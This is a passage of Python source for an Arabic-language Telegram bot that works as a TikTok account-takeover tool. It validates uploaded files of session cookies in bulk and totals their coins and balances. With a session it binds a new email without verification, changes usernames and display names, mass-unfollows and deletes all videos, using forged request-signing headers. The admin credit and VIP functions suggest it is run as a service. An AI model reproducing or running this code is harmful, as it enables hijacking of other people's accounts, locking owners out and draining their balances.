        bot.send_message(message.chat.id, f"<b>{emoji_ban} أرقام فقط.</b>", parse_mode="HTML")

def add_vip_step(message):
    user_id = message.text.strip()
    if user_id.isdigit():
        open(VIP_FILE, "a").write(user_id + "\n")
        bot.reply_to(message, f"<b>{emoji_check} تم تفعيل VIP لـ {user_id}</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"<b>{emoji_ban} أرقام فقط.</b>", parse_mode="HTML")

def remove_vip_step(message):
    user_id = message.text.strip()
    if not user_id.isdigit():
        bot.reply_to(message, f"<b>{emoji_ban} أرقام فقط.</b>", parse_mode="HTML")
        return
    try:
        lines = open(VIP_FILE, "r").readlines()
        open(VIP_FILE, "w").writelines(l for l in lines if l.strip() != user_id)
        bot.reply_to(message, f"<b>❎ تم حذف {user_id} من VIP</b>", parse_mode="HTML")
    except:
        bot.reply_to(message, "<b>⚠️ حدث خطأ.</b>", parse_mode="HTML")

# ==================== دوال الإذاعة ====================

def broadcast_message_handler(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    users_ids = open('id.txt').read().splitlines()
    success = 0
    for uid in users_ids:
        try:
            if message.text:
                bot.send_message(uid, message.text)
            elif message.photo:
                bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption or "")
            elif message.video:
                bot.send_video(uid, message.video.file_id, caption=message.caption or "")
            else:
                bot.copy_message(uid, message.chat.id, message.message_id)
            success += 1
        except:
            continue
    bot.send_message(message.chat.id, f"<b>{emoji_check} انتهت الإذاعة ({success})</b>", parse_mode="HTML")

def get_broadcast_limit(message):
    if not message.text.isdigit():
        bot.reply_to(message, f"<b>{emoji_ban} رقم فقط.</b>", parse_mode="HTML")
        return
    user_broadcast_limits[message.chat.id] = int(message.text)
    msg = bot.send_message(message.chat.id, "<b>✉️ أرسل الرسالة:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, broadcast_by_limit)

def broadcast_by_limit(message):
    chat_id = message.chat.id
    number = user_broadcast_limits.get(chat_id, 0)
    users_ids = open('id.txt').read().splitlines()[:number]
    success = 0
    for uid in users_ids:
        try:
            if message.text:
                bot.send_message(uid, message.text)
            elif message.photo:
                bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption)
            else:
                bot.copy_message(uid, message.chat.id, message.message_id)
            success += 1
        except:
            continue
    bot.send_message(chat_id, f"<b>{emoji_check} انتهت الإذاعة ({success})</b>", parse_mode="HTML")

def broadcast_directing_handler(message):
    chat_id = message.chat.id
    users_ids = open('id.txt').read().splitlines()
    success = 0
    for uid in users_ids:
        try:
            bot.forward_message(uid, message.chat.id, message.message_id)
            success += 1
        except:
            continue
    bot.send_message(chat_id, f"<b>{emoji_check} انتهت الإذاعة ({success})</b>", parse_mode="HTML")

def broadcast_vip_handler(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    vip_ids = get_all_vip()
    success = 0
    for uid in vip_ids:
        try:
            if message.text:
                bot.send_message(uid, message.text)
            elif message.photo:
                bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption or "")
            elif message.video:
                bot.send_video(uid, message.video.file_id, caption=message.caption or "")
            else:
                bot.copy_message(uid, message.chat.id, message.message_id)
            success += 1
        except:
            continue
    bot.send_message(message.chat.id, f"<b>{emoji_check} انتهت إذاعة VIP ({success})</b>", parse_mode="HTML")

# ==================== دوال الكريدت ====================

def add_credits_step(message):
    try:
        parts = message.text.strip().split()
        if len(parts) != 2:
            bot.reply_to(message, "<b>❌ أرسل: ايدي + كمية</b>", parse_mode="HTML")
            return
        uid = int(parts[0])
        amount = int(parts[1])
        if amount <= 0:
            bot.reply_to(message, "<b>❌ الكمية يجب أن تكون أكبر من 0</b>", parse_mode="HTML")
            return
        new_amount = add_credits(uid, amount)
        bot.reply_to(message, f"<b>{emoji_check} تم إضافة {amount} كريدت للمستخدم {uid}\nالمجموع: {new_amount}</b>", parse_mode="HTML")
    except:
        bot.reply_to(message, "<b>❌ خطأ في الإدخال</b>", parse_mode="HTML")

def remove_credits_step(message):
    try:
        parts = message.text.strip().split()
        if len(parts) != 2:
            bot.reply_to(message, "<b>❌ أرسل: ايدي + كمية</b>", parse_mode="HTML")
            return
        uid = int(parts[0])
        amount = int(parts[1])
        if amount <= 0:
            bot.reply_to(message, "<b>❌ الكمية يجب أن تكون أكبر من 0</b>", parse_mode="HTML")
            return
        new_amount = remove_credits(uid, amount)
        bot.reply_to(message, f"<b>{emoji_check} تم حذف {amount} كريدت من المستخدم {uid}\nالمجموع: {new_amount}</b>", parse_mode="HTML")
    except:
        bot.reply_to(message, "<b>❌ خطأ في الإدخال</b>", parse_mode="HTML")

# ==================== دوال القنوات ====================

def channel_number_qn(call):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("تفعيل قناة", callback_data='qn'),
        InlineKeyboardButton("مسح قناة", callback_data='delqn')
    )
    markup.add(
        InlineKeyboardButton("عرض القنوات", callback_data='listqn'),
        InlineKeyboardButton("رجوع", callback_data="back_to_admin")
    )
    bot.edit_message_text(f"<b>{emoji4} قسم الاشتراك الإجباري:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

def add_channel_step(message):
    global mandatory_channels_list
    channel = message.text.strip()
    if channel not in mandatory_channels_list:
        mandatory_channels_list.append(channel)
        save_mandatory_channels()
        bot.send_message(message.chat.id, f"<b>{emoji_check} تم تفعيل {channel}</b>", parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "<b>⚠️ مفعلة بالفعل.</b>", parse_mode="HTML")

def del_channel_step(message):
    global mandatory_channels_list
    channel = message.text.strip()
    if channel in mandatory_channels_list:
        mandatory_channels_list.remove(channel)
        save_mandatory_channels()
        bot.send_message(message.chat.id, f"<b>{emoji_check} تم حذف {channel}</b>", parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "<b>⚠️ غير موجودة.</b>", parse_mode="HTML")

def show_channels_list(call):
    channels_text = "\n".join(mandatory_channels_list) if mandatory_channels_list else "لا توجد قنوات مفعلة"
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("رجوع", callback_data="channel_number"))
    bot.edit_message_text(f"<b>{emoji_list} القنوات:\n\n{channels_text}</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

# ==================== دوال الرسائل الإضافية ====================

def set_message_start_menu(call):
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("تعييـن رساله", callback_data='set_message'),
        InlineKeyboardButton("مسح الرسـائل", callback_data='delete_message')
    )
    markup.add(
        InlineKeyboardButton("عرض الرسائل", callback_data="view_messages"),
        InlineKeyboardButton("رجوع", callback_data="back_to_admin")
    )
    bot.edit_message_text(f"<b>{emoji3} رسالة start الإضافية</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

def save_custom_message_step(message):
    global custom_messages
    custom_messages.append(message.text)
    bot.send_message(message.chat.id, f"<b>{emoji_check} تم حفظ الرسالة.</b>", parse_mode="HTML")

# ==================== دوال تغيير البيانات ====================

def process_change_username(message):
    cid = message.chat.id
    sessionid = message.text.strip()
    temp_data[cid] = {'sessionid': sessionid}
    msg = bot.send_message(cid, f"<b>{emoji2} أرسل اليوزر الجديد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_change_username_step2)

def process_change_username_step2(message):
    cid = message.chat.id
    new_username = message.text.strip().replace("@", "")
    sessionid = temp_data.get(cid, {}).get('sessionid', '')
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري تغيير اليوزر...</b>", parse_mode="HTML")
    result = change_username_tiktok(sessionid, new_username)
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass
    if 'error' in result:
        bot.send_message(cid, f"<b>{emoji_ban} فشل: {result['error']}</b>", parse_mode="HTML")
    elif result.get('status_code') == 0:
        bot.send_message(cid, f"<b>{emoji_check} تم تغيير اليوزر إلى: @{new_username}</b>", parse_mode="HTML")
    else:
        bot.send_message(cid, f"<b>{emoji_ban} فشل تغيير اليوزر</b>", parse_mode="HTML")
    if cid in temp_data:
        del temp_data[cid]
    user_states[cid] = None

def ask_for_email_change(message):
    cid = message.chat.id
    sessionid = message.text.strip()
    temp_data[cid] = {'sessionid': sessionid}
    msg = bot.send_message(cid, f"<b>{emoji_email_f} أرسل الإيميل الجديد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_email_change)

def process_email_change(message):
    cid = message.chat.id
    new_email = message.text.strip()
    sessionid = temp_data.get(cid, {}).get('sessionid', '')
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري تغيير الإيميل...</b>", parse_mode="HTML")
    result = change_email_tiktok(sessionid, new_email)
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass
    if 'error' in result:
        bot.send_message(cid, f"<b>{emoji_ban} فشل تغيير الإيميل: {result['error']}</b>", parse_mode="HTML")
    elif result.get('status_code') == 0:
        bot.send_message(cid, f"<b>{emoji_check} تم تغيير الإيميل إلى: {new_email}</b>", parse_mode="HTML")
    else:
        bot.send_message(cid, f"<b>{emoji_ban} فشل تغيير الإيميل</b>", parse_mode="HTML")
    if cid in temp_data:
        del temp_data[cid]
    user_states[cid] = None

def ask_for_display_name_change(message):
    cid = message.chat.id
    sessionid = message.text.strip()
    temp_data[cid] = {'sessionid': sessionid}
    msg = bot.send_message(cid, f"<b>{emoji_username} أرسل الاسم الجديد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_display_name_change)

def process_display_name_change(message):
    cid = message.chat.id
    new_name = message.text.strip()
    sessionid = temp_data.get(cid, {}).get('sessionid', '')
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري تغيير الاسم...</b>", parse_mode="HTML")
    result = change_display_name_tiktok(sessionid, new_name)
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass
    if 'error' in result:
        bot.send_message(cid, f"<b>{emoji_ban} فشل تغيير الاسم: {result['error']}</b>", parse_mode="HTML")
    elif result.get('status_code') == 0:
        bot.send_message(cid, f"<b>{emoji_check} تم تغيير الاسم إلى: {new_name}</b>", parse_mode="HTML")
    else:
        bot.send_message(cid, f"<b>{emoji_ban} فشل تغيير الاسم</b>", parse_mode="HTML")
    if cid in temp_data:
        del temp_data[cid]
    user_states[cid] = None

def ask_for_all_change(message):
    cid = message.chat.id
    sessionid = message.text.strip()
    temp_data[cid] = {'sessionid': sessionid}
    msg = bot.send_message(cid, f"<b>{emoji_email_f} أرسل الإيميل الجديد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, ask_for_all_change_email)

def ask_for_all_change_email(message):
    cid = message.chat.id
    new_email = message.text.strip()
    temp_data[cid]['new_email'] = new_email
    msg = bot.send_message(cid, f"<b>{emoji_username} أرسل اليوزر الجديد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, ask_for_all_change_username)

def ask_for_all_change_username(message):
    cid = message.chat.id
    new_username = message.text.strip().replace("@", "")
    temp_data[cid]['new_username'] = new_username
    msg = bot.send_message(cid, f"<b>{emoji2} أرسل الاسم الظاهر الجديد:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_all_change)

def process_all_change(message):
    cid = message.chat.id
    new_display_name = message.text.strip()
    data = temp_data.get(cid, {})
    sessionid = data.get('sessionid', '')
    new_email = data.get('new_email', '')
    new_username = data.get('new_username', '')
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري تغيير كل البيانات...</b>", parse_mode="HTML")
    results = change_all_tiktok(sessionid, new_username, new_email, new_display_name)
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass
    response_text = f"<b>📋 نتائج التغيير:</b>\n\n"
    if 'username' in results:
        if results['username'].get('status_code') == 0:
            response_text += f"{emoji_check} اليوزر: @{new_username}\n"
        else:
            response_text += f"{emoji_ban} اليوزر: فشل\n"
    if 'email' in results:
        if results['email'].get('status_code') == 0:
            response_text += f"{emoji_check} الإيميل: {new_email}\n"
        else:
            response_text += f"{emoji_ban} الإيميل: فشل\n"
    if 'display_name' in results:
        if results['display_name'].get('status_code') == 0:
            response_text += f"{emoji_check} الاسم: {new_display_name}\n"
        else:
            response_text += f"{emoji_ban} الاسم: فشل\n"
    bot.send_message(cid, response_text, parse_mode="HTML")
    if cid in temp_data:
        del temp_data[cid]
    user_states[cid] = None

# ==================== دوال الفحص ====================

def process_username_check(message):
    cid = message.chat.id
    username = message.text.strip().replace("@", "")
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري الفحص المتقدم لـ @{username}...</b>", parse_mode="HTML")
    user_info = info(username)
    if not user_info:
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        bot.send_message(cid, f"<b>{emoji_ban} لم يتم العثور على المستخدم.</b>", parse_mode="HTML")
        user_states[cid] = None
        return
    caption = f"<b>{emoji1} Username: @{username}\n"
    if user_info.get('name'):
        caption += f"{emoji2} Name: {user_info['name']}\n"
    if user_info.get('user_id'):
        caption += f"{emoji3} ID: {user_info['user_id']}\n"
    level = get_level(user_info['user_id'])
    if level:
        caption += f"{emoji15} Level: {level}\n"
    if user_info.get('followers'):
        caption += f"{emoji5} Followers: {user_info['followers']}\n"
    if user_info.get('following'):
        caption += f"{emoji6} Following: {user_info['following']}\n"
    if user_info.get('like'):
        caption += f"{emoji7} Likes: {user_info['like']}\n"
    if user_info.get('video'):
        caption += f"{emoji8} Videos: {user_info['video']}\n"
    if user_info.get('private'):
        caption += f"{emoji4} Private: {'Yes' if user_info['private'] == 'true' else 'No'}\n"
    if user_info.get('bio'):
        caption += f"{emoji3} Bio: {user_info['bio']}\n"
    coins, money = get_coins_by_username(username)
    caption += f"\n{emoji16} Coins: {coins}\n{emoji17} Money: {money} $\n"
    caption += "</b>"
    user_states[cid] = None
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass
    if user_info.get('avatar'):
        try:
            bot.send_photo(cid, user_info['avatar'], caption=caption, parse_mode="HTML")
        except:
            bot.send_message(cid, caption, parse_mode="HTML")
    else:
        bot.send_message(cid, caption, parse_mode="HTML")

def process_session_advanced_check(message):
    cid = message.chat.id
    sessionid = message.text.strip()
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري الفحص المتقدم بالسيشن...</b>", parse_mode="HTML")
    ses = info_session(sessionid)
    if not ses:
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        bot.send_message(cid, f"<b>{emoji_ban} سيشن غير صالح أو منتهي الصلاحية</b>", parse_mode="HTML")
        user_states[cid] = None
        return
    username = ses['username']
    user_info = info(username)
    coins, money = get_coins(sessionid)
    level = get_level(user_info['user_id']) if user_info else None
    caption = f"<b>{emoji1} Username: @{username}\n"
    if user_info and user_info.get('name'):
        caption += f"{emoji2} Name: {user_info['name']}\n"
    if user_info and user_info.get('user_id'):
        caption += f"{emoji3} ID: {user_info['user_id']}\n"
    if level:
        caption += f"{emoji15} Level: {level}\n"
    else:
        caption += f"{emoji15} Level: غير متاح\n"
    if user_info and user_info.get('followers'):
        caption += f"{emoji5} Followers: {user_info['followers']}\n"
    if user_info and user_info.get('following'):
        caption += f"{emoji6} Following: {user_info['following']}\n"
    if user_info and user_info.get('like'):
        caption += f"{emoji7} Likes: {user_info['like']}\n"
    if user_info and user_info.get('video'):
        caption += f"{emoji8} Videos: {user_info['video']}\n"
    if user_info and user_info.get('private'):
        caption += f"{emoji4} Private: {'Yes' if user_info['private'] == 'true' else 'No'}\n"
    if user_info and user_info.get('bio'):
        caption += f"{emoji3} Bio: {user_info['bio']}\n"
    caption += f"\n<blockquote expandable>{emoji16} Coins: {coins}\n{emoji17} Money: {money} $</blockquote>\n"
    caption += f"\n{emoji20} Account Details:\n"
    caption += f"{emoji10} Email: {ses['email'] if ses['email'] else 'غير متاح'}\n"
    caption += f"{emoji11} Mobile: {ses['mobile'] if ses['mobile'] else 'غير متاح'}\n"
    caption += "</b>"
    user_states[cid] = None
    try:
        bot.delete_message(cid, status_msg.message_id)
    except:
        pass
    if user_info and user_info.get('avatar'):
        try:
            bot.send_photo(cid, user_info['avatar'], caption=caption, parse_mode="HTML")
        except:
            bot.send_message(cid, caption, parse_mode="HTML")
    else:
        bot.send_message(cid, caption, parse_mode="HTML")

def process_unfollow_new(message):
    cid = message.chat.id
    sessionid = message.text.strip()
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري الغاء المتابعة...</b>", parse_mode="HTML")
    demo = DEMO(sessionid, "1")
    uid = demo.login_sessionid()
    if not uid:
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        bot.send_message(cid, f"<b>{emoji_ban} السيشن غير صالح.</b>", parse_mode="HTML")
        user_states[cid] = None
        return
    count_done = 0
    try:
        while True:
            ids = demo.get_id_to_unfollow()
            if not ids:
                break
            count_done += len(ids)
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                ff = [executor.submit(demo.un_follow, idd) for idd in ids]
                concurrent.futures.wait(ff)
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        bot.send_message(cid, f"<b>{emoji_check} تم الغاء المتابعة! ({count_done})</b>", parse_mode="HTML")
    except Exception as e:
        try:
            bot.delete_message(cid, status_msg.message_id)
        except:
            pass
        bot.send_message(cid, f"<b>{emoji_ban} خطأ: {str(e)}</b>", parse_mode="HTML")
    user_states[cid] = None

# ==================== دوال البايو ====================

def ask_for_new_bio(message):
    new_bio = message.text.strip()
    temp_data[message.chat.id] = {'new_bio': new_bio}
    msg = bot.send_message(message.chat.id, f"<b>{emoji1} أرسل السيشن:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_change_bio)

def process_change_bio(message):
    session_id = message.text.strip()
    new_bio = temp_data.get(message.chat.id, {}).get('new_bio', '')
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري تغيير البايو...</b>", parse_mode="HTML")
    try:
        demo = DEMO(session_id, "1")
        p, h = demo.Vals()
        payload = {'signature': new_bio}
        m = demo.sign(urllib.parse.urlencode(p), urllib.parse.urlencode(payload))
        h.update({
            'x-ss-req-ticket': m['x-ss-req-ticket'],
            'x-argus': m["x-argus"],
            'x-gorgon': m["x-gorgon"],
            'x-khronos': m["x-khronos"],
            'x-ladon': m["x-ladon"],
            'content-type': "application/x-www-form-urlencoded"
        })
        res = requests.post(f'https://api16-normal-c-alisg.tiktokv.com/aweme/v1/commit/user/?{urllib.parse.urlencode(p)}', data=payload, headers=h)
        if res.status_code == 200:
            bot.edit_message_text(f"<b>{emoji_check} تم تغيير البايو!</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
        else:
            bot.edit_message_text(f"<b>{emoji_ban} فشل تغيير البايو</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"<b>{emoji_ban} خطأ: {str(e)}</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")

def ask_for_email(message):
    email = message.text.strip()
    session_id = session_info_data.get(message.chat.id, '')
    temp_data[message.chat.id] = {'email': email, 'session_id': session_id}
    process_bind_email_direct(message)

def process_bind_email_direct(message):
    email = temp_data.get(message.chat.id, {}).get('email', '')
    session_id = temp_data.get(message.chat.id, {}).get('session_id', '')
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري ربط البريد...</b>", parse_mode="HTML")
    if not SIGNERPY_AVAILABLE:
        bot.edit_message_text(f"<b>{emoji_ban} مكتبة SignerPy غير متوفرة</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
        return
    try:
        save = open(IID_FILE, 'r').read().splitlines()
        did, iid = random.choice(save).split(":", 1)
    except:
        did = "7427048691142395393"
        iid = "7574913218801157889"
    url = f'https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?device_id={did}&iid={iid}&aid=1233'
    data = f"email={email}"
    cookies = {"sessionid": session_id}
    signaturez = sign(params=url, cookie=cookies, data=data)
    headers = {'sdk-version': '2', 'user-agent': 'com.zhiliaoapp.musically/2021306050'}
    headers.update(signaturez)
    response = requests.post(url=url, data=data, headers=headers, cookies=cookies)
    if response.json().get('message') == 'success':
        bot.edit_message_text(f"<b>{emoji_check} تم ربط البريد {email}!</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
    else:
        bot.edit_message_text(f"<b>{emoji_ban} فشل ربط البريد</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")

# ==================== دوال أدوات TikTok ====================

def ask_for_new_tool_session(message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    session_id = message.text.strip()
    notify_action(message.from_user, "معلومات الحساب" if state == "session_info" else "حذف الفيديوهات")
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري المعالجة...</b>", parse_mode="HTML")
    try:
        if state == "session_info":
            demo = DEMO(session_id, "1")
            p, h = demo.Vals()
            h.update({'Host': 'api16-normal-c-alisg.tiktokv.com'})
            ress = requests.get(f'https://api16-normal-c-alisg.tiktokv.com/passport/account/info/v2/?{urllib.parse.urlencode(p)}', headers=h)
            if 'user_id' in ress.text:
                data = ress.json()["data"]
                info_text = f"<b>ℹ️ معلومات الحساب:\n\n{emoji_username} Username: <code>{data.get('username', 'N/A')}</code>\n{emoji_userid} User ID: <code>{data.get('user_id', 'N/A')}</code>\n{emoji_email_f} Email: <code>{data.get('email', 'N/A')}</code>\n{emoji_mobile_f} Mobile: <code>{data.get('mobile', 'N/A')}</code></b>"
                session_info_data[message.chat.id] = session_id
                kb = InlineKeyboardMarkup().add(InlineKeyboardButton("ربط بريد", callback_data="bind_email_action"))
                bot.edit_message_text(info_text, message.chat.id, status_msg.message_id, parse_mode="HTML", reply_markup=kb)
                user_states[user_id] = None
                return
            else:
                bot.edit_message_text(f"<b>{emoji_ban} السيشن غير صالح.</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
        elif state == "delete_videos":
            demo = DEMO(session_id, "1")
            uid = demo.login_sessionid()
            if not uid:
                bot.edit_message_text(f"<b>{emoji_ban} السيشن غير صالح.</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
                return
            deleted = 0
            while True:
                p, h = demo.Vals()
                p.update({'user_id': uid, 'count': '100', 'max_cursor': '0'})
                m = demo.sign(params=urllib.parse.urlencode(p), payload="", cookie="")
                h.update({
                    'x-ss-req-ticket': m['x-ss-req-ticket'],
                    'x-argus': m["x-argus"],
                    'x-gorgon': m["x-gorgon"],
                    'x-khronos': m["x-khronos"],
                    'x-ladon': m["x-ladon"]
                })
                r = requests.get(f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/public/item/list/?{urllib.parse.urlencode(p)}', headers=h)
                ids = re.findall(r'"aweme_id"\s*:\s*"(\d+)"', r.text)
                if not ids:
                    break
                for aweme_id in ids:
                    requests.get(f'https://www.tiktok.com/api/aweme/delete/?aweme_id={aweme_id}&aid=1988', headers={'Cookie': f'sessionid={session_id}', 'User-Agent': 'Mozilla/5.0'})
                    deleted += 1
            bot.edit_message_text(f"<b>{emoji_check} تم حذف {deleted} فيديو!</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"<b>{emoji_ban} خطأ: {str(e)}</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
    user_states[user_id] = None

def ask_for_session(message):
    user_id = message.from_user.id
    if not check_user_access(message):
        user_states[user_id] = None
        return
    session_id = message.text.strip()
    notify_action(message.from_user, "فحص سيشن فردي")
    res = request_tiktok_session(session_id)
    if not res["status"]:
        update_stats("invalid")
        bot.send_message(message.chat.id, f"<b>{emoji_ban} السيشن غير صالح أو منتهي</b>", parse_mode="HTML")
        user_states[user_id] = None
        return
    update_stats("valid")
    # إضافة كريدت للمستخدم إذا كانت الميزة مفعلة
    if get_feature_status("credits_system"):
        add_credits(user_id, 1)
    text = f"<b>{emoji_coin} Coins: {res['coins']}\n{emoji_diamond} Diamonds: {res['diamonds']}\n{emoji_money} Balance: {res['balance']}</b>"
    bot.send_message(message.chat.id, text, parse_mode="HTML")
    user_states[user_id] = None

def ask_for_file(message):
    user_id = message.from_user.id
    if not check_user_access(message):
        user_states[user_id] = None
        return
    if not message.document:
        bot.reply_to(message, f"<b>{emoji_ban} يرجى إرسال ملف .txt</b>", parse_mode="HTML")
        user_states[user_id] = None
        return
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "<b>⚠️ ملف .txt فقط</b>", parse_mode="HTML")
        user_states[user_id] = None
        return
    notify_action(message.from_user, "فحص ملف سيشنات")
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري تحميل الملف وبدء الفحص...</b>", parse_mode="HTML")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8')
        sessions = list(set(re.findall(r'[a-zA-Z0-9_-]{20,}', content)))
        if not sessions:
            bot.edit_message_text(f"<b>{emoji_ban} لم يتم العثور على سيشنات</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
            user_states[user_id] = None
            return
        total = len(sessions)
        bot.edit_message_text(f"<b>🔍 تم العثور على {total} سيشن. جاري الفحص...</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
        valid_count = 0
        invalid_count = 0
        total_coins = 0
        total_balance = 0
        total_diamonds = 0
        report_text = ""
        valid_sessions_text = ""
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for session_id in sessions:
                future = executor.submit(request_tiktok_session, session_id)
                futures.append((session_id, future))
            for i, (session_id, future) in enumerate(futures, 1):
                try:
                    res = future.result(timeout=REQUEST_TIMEOUT)
                except:
                    res = {"status": False}
                if i % 10 == 0 or i == total:
                    try:
                        bot.edit_message_text(
                            f"<b>⏳ الفحص... {i}/{total}\n{emoji_check} صالح: {valid_count}\n{emoji_ban} غير صالح: {invalid_count}</b>",
                            message.chat.id,
                            status_msg.message_id,
                            parse_mode="HTML"
                        )
                    except:
                        pass
                if res.get("status", False):
                    valid_count += 1
                    update_stats("valid")
                    total_coins += res.get('coins', 0)
                    total_diamonds += res.get('diamonds', 0)
                    try:
                        total_balance += float(str(res.get('balance', '0')).replace("$", "").strip())
                    except:
                        pass
                    report_text += f"<b>{emoji_session_f} <code>{session_id}</code>\n{emoji_coin} Coins: {res['coins']}\n{emoji_diamond} Diamonds: {res['diamonds']}\n{emoji_money} Balance: {res['balance']}\n\n</b>"
                    valid_sessions_text += f"Session: {session_id}\nCoins: {res['coins']}\nDiamonds: {res['diamonds']}\nBalance: {res['balance']}\n{'─'*30}\n"
                else:
                    invalid_count += 1
                    update_stats("invalid")
        try:
            bot.delete_message(message.chat.id, status_msg.message_id)
        except:
            pass
        summary_text = f"<b>{emoji20} ملخص الفحص:\n{'━'*25}\n{emoji_check} صالحة: {valid_count}\n{emoji_ban} فاشلة: {invalid_count}\n📁 الإجمالي: {total}\n{emoji_coin} Coins: {total_coins:,}\n{emoji_diamond} Diamonds: {total_diamonds:,}\n{emoji_money} Balance: ${total_balance:,.2f}\n{'━'*25}</b>"
        if total > 50:
            filename = f"results_{user_id}_{int(time.time())}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"نتائج فحص ملف السيشنات\n{'='*40}\n\n")
                f.write(f"صالح: {valid_count} | فاشل: {invalid_count} | الإجمالي: {total}\n")
                f.write(f"Coins: {total_coins:,} | Diamonds: {total_diamonds:,} | Balance: ${total_balance:,.2f}\n")
                f.write(f"{'='*40}\n\n")
                f.write(valid_sessions_text)
            with open(filename, "rb") as f:
                bot.send_document(message.chat.id, f, caption=summary_text, parse_mode="HTML")
            os.remove(filename)
        else:
            if not report_text:
                bot.send_message(message.chat.id, f"<b>{emoji_ban} جميع السيشنات غير صالحة.</b>", parse_mode="HTML")
            else:
                bot.send_message(message.chat.id, f"<b>{emoji_check} تم إكمال الفحص!</b>", parse_mode="HTML")
                if len(report_text) > 4000:
                    for chunk in [report_text[i:i+3900] for i in range(0, len(report_text), 3900)]:
                        bot.send_message(message.chat.id, chunk.strip(), parse_mode="HTML")
                        time.sleep(0.3)
                else:
                    bot.send_message(message.chat.id, report_text.strip(), parse_mode="HTML")
            bot.send_message(message.chat.id, summary_text, parse_mode="HTML")
        user_states[user_id] = None
    except Exception as e:
        try:
            bot.delete_message(message.chat.id, status_msg.message_id)
        except:
            pass
        bot.send_message(message.chat.id, f"<b>{emoji_ban} خطأ: {e}</b>", parse_mode="HTML")
        user_states[user_id] = None

def ask_for_accounts_file(message):
    user_id = message.from_user.id
    if not check_user_access(message):
        user_states[user_id] = None
        return
    if not message.document:
        bot.reply_to(message, f"<b>{emoji_ban} ارسل ملف .txt</b>", parse_mode="HTML")
        user_states[user_id] = None
        return
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "<b>⚠️ ملف .txt فقط</b>", parse_mode="HTML")
        user_states[user_id] = None
        return
    notify_action(message.from_user, "فحص حسابات (ملف)")
    status_msg = bot.reply_to(message, f"<b>{emoji1} جاري الفحص...</b>", parse_mode="HTML")
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8')
        sessions = list(set(re.findall(r'[a-zA-Z0-9_-]{20,}', content)))
        if not sessions:
            bot.edit_message_text(f"<b>{emoji_ban} لم يتم العثور على سيشنات</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
            user_states[user_id] = None
            return
        total = len(sessions)
        bot.edit_message_text(f"<b>🔍 تم العثور على {total} حساب...</b>", message.chat.id, status_msg.message_id, parse_mode="HTML")
        valid_count = 0
        invalid_count = 0
        report_text = ""
        for session_id in sessions:
            demo = DEMO(session_id, "1")
            p, h = demo.Vals()
            h.update({'Host': 'api16-normal-c-alisg.tiktokv.com'})
            try:
                ress = requests.get(f'https://api16-normal-c-alisg.tiktokv.com/passport/account/info/v2/?{urllib.parse.urlencode(p)}', headers=h, timeout=10)
                if 'user_id' in ress.text:
